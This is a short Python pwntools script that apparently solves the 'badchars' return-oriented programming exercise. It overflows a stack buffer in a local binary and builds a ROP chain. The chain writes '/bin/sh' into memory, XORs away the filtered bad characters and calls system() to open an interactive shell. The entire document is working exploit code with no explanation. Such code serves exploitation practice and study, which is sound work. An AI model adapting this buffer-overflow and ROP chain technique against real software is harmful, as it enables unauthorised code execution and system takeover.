from pwn import *

badchars = 'bic/ fns'

# xor BYTE PTR [r15],r14b; ret;
gadget1 = 0x400b30
# pop r14; pop r15; ret;
gadget2 = 0x400b40
# mov qword ptr [r13], r12; ret;
gadget3 = 0x400b34
# pop r12; pop r13; ret;
gadget4 = 0x400b3b
# pop rdi; ret;
gadget5 = 0x400b39

system = 0x4006f0
buffer = 0x601074
string = '/bin/sh\x00'

def badchar_xor(c):
    return chr(ord(c) ^ 0xeb)

# build rop gadgets to fix
# badchars in memory
def build_rop_gadget(s):
    payload = ''
    for i in xrange(len(s)):
        if s[i] in badchars:
            payload += p64(gadget2)
            payload += badchar_xor(s[i]).ljust(8, '\x00')
            payload += p64(buffer + i)
            payload += p64(gadget1)

    return payload

p = process('./badchars')

payload = 'a' * 40
payload += p64(gadget4)
payload += string.ljust(8, '\x00')
payload += p64(buffer)

payload += p64(gadget3)
payload += build_rop_gadget(string)

payload += p64(gadget5)
payload += p64(buffer)

payload += p64(system)
payload += 'cccccccc'

p.sendline(payload)
p.interactive()
